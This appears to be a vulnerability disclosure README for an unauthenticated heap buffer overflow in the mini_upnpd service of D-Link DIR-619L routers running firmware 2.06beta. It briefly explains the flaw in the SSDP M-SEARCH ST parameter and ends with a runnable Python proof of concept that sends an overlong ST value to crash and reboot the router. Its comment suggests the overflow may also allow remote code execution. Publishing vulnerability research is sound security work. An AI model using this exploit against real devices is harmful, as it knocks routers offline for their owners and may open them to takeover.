# 619L_upnpd_heapoverflow


**Vender** ：D-Link

**Firmware version**:2.06beta

**Exploit Author**: ys110

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-619L

Vul detail
========

An issue was discovered in / bin / mini_upnpd on D-Link DIR-619L 2.06beta devices. There is a heap buffer overflow allowing remote attackers to restart router via the M-search request ST parameter. No authentication required

In the handler of router mini_upnpd processSSDPrequest, it will respond to the M-search request packet. ST is the parameter of the ssdp M-search request packet

![image](https://github.com/hhhhu8045759/619L_upnpd_heapoverflow/blob/master/7.png)

![image](https://github.com/hhhhu8045759/619L_upnpd_heapoverflow/blob/master/6.png)

the ST parameter is copied to the heap space in the SendSSDPAnnounce2 function. however there is no correctly check ,Causes a heap overflow, a very long input could lead to heap overflow causing the router service to crash and the router to restart


![image](https://github.com/hhhhu8045759/619L_upnpd_heapoverflow/blob/master/8.png)
![image](https://github.com/hhhhu8045759/619L_upnpd_heapoverflow/blob/master/ssdp1.png)
![image](https://github.com/hhhhu8045759/619L_upnpd_heapoverflow/blob/master/ssdp.png)

 
 poc
====
```python
import socket


#set the ST value + 'a' * 3000 to overflow of the heap  to cause the router reboot and maybe cause remote code execution 
msg = \
    'M-SEARCH * HTTP/1.1\r\n' \
    'HOST:239.255.255.250:1900\r\n' \
    'ST:upnp:rootdevice' + 'a' * 3000 + '\r\n' \
    'MX:2'  +'\r\n' \
    'MAN:"ssdp:discover"'+ '\r\n' \
    '\r\n'

# Set up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(2)
s.sendto(msg, ('239.255.255.250', 1900) )

try:
    while True:
        data, addr = s.recvfrom(65507)
        print addr, data
except socket.timeout:
    pass

```
